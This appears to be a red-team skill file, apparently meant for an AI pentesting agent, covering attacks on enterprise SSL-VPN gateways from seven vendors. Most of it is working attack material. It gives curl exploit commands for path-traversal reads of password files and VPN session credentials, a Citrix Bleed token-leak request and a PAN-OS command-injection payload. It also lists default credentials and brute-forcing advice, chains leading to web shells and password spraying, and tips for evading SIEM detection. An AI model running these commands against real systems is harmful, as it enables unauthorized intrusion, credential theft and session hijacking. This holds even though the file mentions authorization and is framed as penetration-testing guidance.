---
name: Enterprise VPN & Remote-Access Appliance Attacks
description: External SSL-VPN / remote-access gateway attack matrix (Cisco ASA, FortiGate, Citrix NetScaler, GlobalProtect, Pulse/Ivanti, SonicWall, F5) — fingerprint, CVE triage, pre-auth file-read/RCE, SAML abuse.
tags: [vpn, remote-access, pre-auth-rce, path-traversal, initial-access, ssl-vpn]
recommended_tools: [httpx_probe, nuclei_scan, curl, http_request, http_repeater, python3, hydra_attack, whatweb_scan]
vuln_classes: []
domain: network
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/enterprise-vpn-attack/SKILL.md]}
---

Enterprise SSL-VPN concentrators and remote-access gateways are the single most common external initial-access surface in 2024-2026 intrusion TTPs. Every major vendor (Cisco, Fortinet, Citrix, Palo Alto, Pulse/Ivanti, SonicWall, F5) has shipped pre-auth path-traversal or RCE in the last few release cycles. This skill covers vendor fingerprinting, a versioned CVE matrix, AAA-backend identification, default credentials, and non-disruptive proof techniques.

## When to use this skill

Trigger when recon surfaces:
- `*.<client>/+CSCOE+/logon.html` or `+CSCOE+` paths -> Cisco ASA / AnyConnect
- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains
- 443 login pages banner-matching "AnyConnect", "FortiGate", "NetScaler", "GlobalProtect", "Pulse", "Ivanti"
- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)
- Response cookies: `webvpn=` (Cisco), `SVPNCOOKIE=` (Fortinet), `NSC_AAA=` (Citrix), `DSAuthSession=` (Pulse), `BIGipServer*` (F5)

Do NOT use for: internal lateral movement post-foothold; VPN client-side bugs; IPsec / L2TP / OpenVPN (non-web protocols).

## Gate 0 — deterministic proof before you claim a finding

A CVE path returning `200` is not proof. Require observable, attributable evidence:
- **File-read CVEs:** the response body must contain the file's real content (e.g. `root:x:0:0` from `/etc/passwd`, plaintext usernames/sessions from FortiOS `sslvpn_websession`, `[global]` stanza from `smb.conf`). A `200` with the normal login HTML is a false positive.
- **Memory-disclosure (Citrix Bleed):** response length must vastly exceed the baseline endpoint size (>10 KB) and contain non-static bytes / session-token-shaped strings.
- **Command-injection side-effects:** confirm the out-of-band artifact (file created on the test path, DNS/HTTP callback) — never just a 200.
- **Never conclude "patched" from a single 404.** Patches deploy unevenly and vendors backport silently without bumping the banner. Test 3+ CVEs per vendor before calling it clean.

## Vendor fingerprinting

```bash
# Cisco ASA / AnyConnect
curl -skI 'https://target/+CSCOE+/logon.html' | head -10
# Set-Cookie: webvpn= ; login page contains "AnyConnect" / "CSCOE" / "logon.html"
curl -sk 'https://target/+CSCOE+/saml/sp/metadata'   # 200 = SAML auth enabled
curl -sk 'https://target/CSCOSSLC/config-auth'       # AnyConnect handshake endpoint

# Fortinet FortiGate / FortiOS
curl -skI 'https://target/remote/login' | head -10
# Set-Cookie: SVPNCOOKIE= ; login page contains "FortiGate" / "SSL-VPN"

# Citrix NetScaler / ADC / Gateway
curl -skI 'https://target/' | head -10               # Set-Cookie: NSC_AAA= / NSC_USER= ; Server: NetScaler
curl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'

# Palo Alto GlobalProtect (GP portal is PHP)
curl -skI 'https://target/global-protect/login.esp' | head -10   # Set-Cookie: PHPSESSID=
curl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'

# Pulse Secure / Ivanti Connect Secure
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10   # DSAuthSession= / DSPREAUTH=

# SonicWall NetExtender / SMA
curl -skI 'https://target/cgi-bin/welcome' | head -10   # Set-Cookie: swap= / swapauth=

# F5 Big-IP / APM
curl -skI 'https://target/my.policy' | head -10         # BIGipServer* / MRHSession=
```

Version strings are usually stripped in modern builds — derive from JS/asset paths or behavioral probes, and treat banner-stripped appliances as good defense-in-depth (record as a positive posture finding).

## CVE matrix (2018-2026)

Ordered per vendor; prefer detection-only probes first, escalate to RCE PoCs only with explicit authorization (bricking a concentrator is catastrophic).

### Cisco ASA / AnyConnect

| CVE | Affects | Type | Probe |
|---|---|---|---|
| CVE-2018-0296 | ASA pre-9.x builds | Path traversal — session/config disclosure | `/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
| CVE-2020-3452 | ASA/FTD pre-patch | Path traversal — file read | `/+CSCOE+/files/file_name.html?Filename=...` |
| CVE-2023-20269 | ASA/FTD | SSL-VPN auth bypass | brute group + valid creds vs `/+webvpn+/index.html` |
| CVE-2024-20481 | RAVPN | DoS via crafted handshake | SKIP — disruptive |

```bash
# CVE-2020-3452 file read
curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5
# CVE-2018-0296 path traversal
curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20
# High-value retrievable files on vulnerable ASA:
#   /+CSCOE+/portal_inc.lua        (may reveal local users)
#   /+CSCOE+/session_password.html
#   /+CSCOE+/files/files.html
```

### Fortinet FortiGate / FortiOS

| CVE | Affects | Type | Probe |
|---|---|---|---|
| CVE-2018-13379 | FortiOS 5.4-6.0 | Path traversal — `sslvpn_websession` read | `/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
| CVE-2022-42475 | FortiOS 7.x | Heap overflow — pre-auth RCE | nuclei `CVE-2022-42475` |
| CVE-2023-27997 (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | public PoC / nuclei |
| CVE-2024-21762 | FortiOS 6.x-7.x | OOB write — pre-auth RCE | nuclei `CVE-2024-21762` |
| CVE-2024-55591 | FortiOS 7.0-7.4 | Auth bypass — Node.js websocket admin iface | request admin-interface endpoint |

```bash
# CVE-2018-13379 — most reliably fingerprintable file read
curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
# PROOF: response contains plaintext usernames + session data (format: IP:PORT username password ...)
```

### Citrix NetScaler / ADC / Gateway

| CVE | Affects | Type | Probe |
|---|---|---|---|
| CVE-2019-19781 (Shitrix) | ADC/Gateway 10.5-13.0 | Path traversal -> RCE (XML upload) | `/vpn/../vpns/cfg/smb.conf` |
| CVE-2022-27518 | ADC/Gateway w/ SAML | Pre-auth RCE | nuclei |
| CVE-2023-3519 | ADC/Gateway 13.0-13.1 | Pre-auth RCE via crafted HTTP | public PoC |
| CVE-2023-4966 (Citrix Bleed) | ADC/Gateway 13.0-14.1 | Memory disclosure -> session-token theft | long `Host` header vs OpenID config endpoint |

```bash
# CVE-2019-19781 file read (PROOF: [global] SMB config stanza)
curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'

# CVE-2023-4966 Citrix Bleed detection
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" \
  'https://target/oauth/idp/.well-known/openid-configuration' -o response.txt
# PROOF: response >10KB containing leaked memory / session-token-shaped strings.
# Replaying a leaked NSC_AAAC token bypasses auth AND MFA -> live session.
```

### Palo Alto GlobalProtect

| CVE | Affects | Type | Probe |
|---|---|---|---|
| CVE-2024-3400 | PAN-OS 10.2-11.1 w/ GP | Command injection — pre-auth RCE | crafted `SESSID` cookie path-traversal on `/ssl-vpn/login.esp` |

```bash
# CVE-2024-3400 detection (side-effect based)
curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
  -H 'Cookie: SESSID=../../../var/log/pan/test_$(id)_test.txt' \
  --data 'jsessionid=test'
# PROOF: PAN-OS creates a file on the test path named with the injected command output.
```

### Pulse Secure / Ivanti Connect Secure / Policy Secure

| CVE | Affects | Type | Probe |
|---|---|---|---|
| CVE-2019-11510 | PCS 8.x-9.x | Arbitrary file read | Guacamole traversal to `/etc/passwd` |
| CVE-2021-22893 | PCS 9.x | Pre-auth RCE (multi-step) | nuclei |
| CVE-2023-46805 | ICS 9.1-22.6 | Auth bypass | chains with 21887 |
| CVE-2024-21887 | ICS 9.1-22.6 | Command injection (web component) | `POST /api/v1/totp/user-backup-code/` crafted body |

```bash
# CVE-2019-11510 Pulse file read (PROOF: root:x:0:0 from /etc/passwd)
curl -sk --path-as-is \
  'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
# Full chain: CVE-2023-46805 (auth bypass) + CVE-2024-21887 (cmd injection) -> unauthenticated RCE.
```

### SonicWall

| CVE | Affects | Type | Probe |
|---|---|---|---|
| CVE-2021-20016 | SMA 100 series | Pre-auth SQL injection | nuclei template |
| CVE-2024-40766 | SonicOS | Access-control flaw | version-specific |

## Fast triage with nuclei

```bash
nuclei -u https://target/ \
  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
  -severity high,critical -rl 5
```

Rate-limit hard (`-rl 5`): these are critical infrastructure that log every request to a SIEM.

## SAML SP / IdP misconfigurations (always check)

Most enterprise VPNs front SSO with SAML. SP metadata is anonymous intel — pull it even against a fully patched appliance.

```bash
curl -sk 'https://target/+CSCOE+/saml/sp/metadata' | head -50   # Cisco
curl -sk 'https://target/remote/saml/metadata'     | head -50   # Fortinet
curl -sk 'https://target/saml/login'               | head -30   # Citrix
```

Flag:
- `AuthnRequestsSigned="false"` -> XML Signature Wrapping (XSW) candidate
- `WantAssertionsSigned="false"` -> severe; assertion-replay possible
- audience-restriction validation gaps
- public SP signing cert exposed (replay/forging)

## AAA backend identification

After a failed auth, error details reveal the backend and shape downstream strategy:

| Response pattern | Backend |
|---|---|
| `a0=2` (Cisco) | unknown user |
| `a0=3` (Cisco) | wrong password |
| `a0=4` (Cisco) | login restricted |
| `a0=12` (Cisco) | account locked |
| `a0=115` (Cisco) | generic auth fail (LDAP/RADIUS/AD layer error) |
| `AADSTS...` in body | Entra (SAML) backend |
| `Authentication failed via RADIUS` | RADIUS |
| generic `Invalid username or password` | LDAP or local DB |

Cisco tunnel-group names can leak via response-timing differentials against `/+webvpn+/index.html`; larger latency on a group name suggests it exists. Use with restraint.

## Default credentials (test <=2 attempts/account — lockout risk)

| Vendor | User | Password |
|---|---|---|
| Cisco ASA | admin / enable_15 | cisco |
| Fortinet | admin | (empty) |
| Citrix NetScaler | nsroot | nsroot / (serial) |
| Palo Alto | admin | admin |
| Pulse Secure | admin | password |
| F5 Big-IP | root / admin | default / admin |
| SonicWall | admin | password |

Most production targets have rotated these; a `hydra_attack` here risks account lockout and SIEM alerts — throttle and jitter.

## Operational discipline

- Detection-only first; do NOT run pre-auth RCE PoCs without explicit written OK — a bricked concentrator is catastrophic for the client.
- Rate-limit and jitter; every request is likely logged to a SIEM and may trigger mid-engagement IPS rule deployment.
- Banner-stripped != not vulnerable — keep probing via behavioral fingerprints; vendors backport fixes without bumping versions.
- Document the identified AAA backend (RADIUS-to-local vs SAML-to-Entra) — it changes every downstream path.

## Chaining notes

- **VPN appliance CVE -> RCE -> internal creds:** pre-auth path traversal -> arbitrary write into web-root -> web-shell as root -> extract VPN config + LDAP bind / RADIUS shared secret -> reuse against internal vCenter, AD, etc.
- **Patched appliance + reachable SAML:** fingerprint IdP -> XSW / signature-stripping -> forged assertion -> VPN session with no password/MFA.
- **SAML-to-Entra backend:** pivot leaked credentials into an M365/Entra password-spray on the synced tenant.
- **Anonymous NTLM on mgmt paths:** capture Type-2 -> decode AV_PAIRs -> internal AD forest name -> Entra spray.

CWE references: CWE-22 (path traversal), CWE-77/78 (command injection), CWE-287/288 (auth bypass), CWE-200 (info disclosure), CWE-787 (OOB write).
